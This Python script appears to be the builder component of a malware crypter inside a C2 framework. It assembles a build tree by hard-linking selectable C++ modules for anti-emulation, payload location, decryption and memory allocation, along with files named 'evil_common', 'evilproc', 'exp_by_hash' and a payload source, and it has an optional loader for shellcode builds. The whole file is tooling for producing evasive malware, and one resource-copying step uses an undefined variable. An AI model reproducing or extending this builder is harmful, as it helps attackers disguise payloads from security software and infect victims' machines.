import shutil, json, os, sys

from c2.infra.tool_cli import ToolCLI
from c2.common.execcmd import execcmd

AEs = [
  'empty', 'xxx', 'wnd'
]
LOCATEs = [
  'binhex',
  'resource',
]
DECRYPTs = [
  'cryptbin'
]
ALLOCs = [
  'valloc', 'halloc'
]

_EXTRA_SOURCEs = [
  'evil_common.cpp', 'evil_common.h',
  'check_payload_info.h',
  'ae.h',
  'locate.h',
  'decrypt.h',
  'alloc.h',
  'exp_by_hash.cpp', 'exp_by_hash.h',
  'evilproc.h',
  'ntdefs.h',
  'lpfns.h', 'lpfns.cpp',
  'dbg.h',
  
  #'ldr.h', 'ldr.cpp', # excluded for shellcode
  'pay.h', 'pay.cpp',
]

_sd = os.path.dirname(__file__)

class ConstructCLI(ToolCLI):
  def _initialize(self): self._progname = os.path.basename(__file__)

  def _setup_args(self):
    parser = self._parser
    parser.add_argument('-o', '--outdir', required=True)
    parser.add_argument('-a', '--antiemu', required=True, choices=AEs)
    parser.add_argument('-l', '--locate', required=True, choices=LOCATEs)  # obsolete
    parser.add_argument('-d', '--decrypt', required=True, choices=DECRYPTs)  # obsolete
    # parser.add_argument('-u', '--chfn', nargs='*', action='append', required=True)  # -u chfn_resload chfn_imgload chfn_unsteg chfn_bincryptd chfn_merge
    parser.add_argument('-z', '--alloc', required=True, choices=ALLOCs)
    parser.add_argument('--ldr', action='store_true', help='include ldr.h and ldr.cpp sources')
    parser.add_argument('-r', '--rsrc_decay', required=False)


  def _do_work(self):
    args = self._args
    self._cryptor_root_real = os.path.realpath(f'{_sd}/..')
    print(f'( ) {self._cryptor_root_real=}')

    self.outdir_src = os.path.join(args.outdir, 'src')
    outdir_src = self.outdir_src
    self.outdir_rsrc = os.path.join(args.outdir, 'rsrc')

    print(f'( ) cleaning {outdir_src}...')
    shutil.rmtree(outdir_src, ignore_errors=True)
    print(f'( ) cleaning {self.outdir_rsrc}...')
    shutil.rmtree(self.outdir_rsrc, ignore_errors=True)

    os.makedirs(outdir_src)
    fantiemu = f'ae_{args.antiemu}'
    flocate = f'locate_{args.locate}'
    fdecrypt = f'decrypt_{args.decrypt}'
    falloc = f'alloc_{args.alloc}'

    print(f'( ) making hardlinks to cpp,h files')
    self.__process_cpp_part(fantiemu)
    self.__process_cpp_part(flocate)
    self.__process_cpp_part(fdecrypt)
    self.__process_cpp_part(falloc)

    # FUTURE
    '''
    #define CHFN{i}      {chfn[i]} # chfn_resload
    '''

    extra_sources_to_use = _EXTRA_SOURCEs.copy()
    if args.ldr:
      extra_sources_to_use += ['ldr.h', 'ldr.cpp']

    partlist = []
    partlist.extend([fantiemu, flocate, fdecrypt, falloc])

    print(f'( ) making extra sources hardlinks') #obsolete
    for extrasrc in extra_sources_to_use:
      execcmd(f'mklink /H {outdir_src}\\{extrasrc} {self._cryptor_root_real}\\cpp_parts\\{extrasrc}')
      # collect only for .cpp, this means we would not visit same .json twice (for .h items)
      fname, ext = extrasrc.split('.')
      if ext.upper() == 'CPP':
        extrasrc_basen = extrasrc.split('.')[0] # remove extension
        partlist.append(extrasrc_basen)


    # dump partlist
    parts_lst_path = f'{outdir_src}/parts.lst'
    open(parts_lst_path, 'w').write('\n'.join(partlist))
    print(f'partlist written to {parts_lst_path}')

    if args.rsrc_decay:
      drsrc = f'{self._cryptor_root_real}/resources/{args.rsrc_decay}'
      print(f'( ) copying resources from \'{args.rsrc_decay}\'')

      shutil.copytree(f'{drsrc}', f'{outdir_rsrc}/')  # makes rsrc dir

      # remove .aps file (temporary VS resource file)
      execcmd(f'del /q /s {outdir_rsrc}\\*.aps')
      # TODO : add payload resource <wtf?

    print('(+) construction done')


  # this routine collects things that __dump_partinfo_header dumps
  def __process_cpp_part(self, cpp_file_title):
    args = self._args
    outdir_src = self.outdir_src
    execcmd(f'mklink /H {outdir_src}\\{cpp_file_title}.cpp {self._cryptor_root_real}\\cpp_parts\\{cpp_file_title}.cpp')
    execcmd(f'mklink /H {outdir_src}\\{cpp_file_title}.h {self._cryptor_root_real}\\cpp_parts\\{cpp_file_title}.h')


if __name__ == '__main__':
  ConstructCLI(sys.argv[1:]).execute()






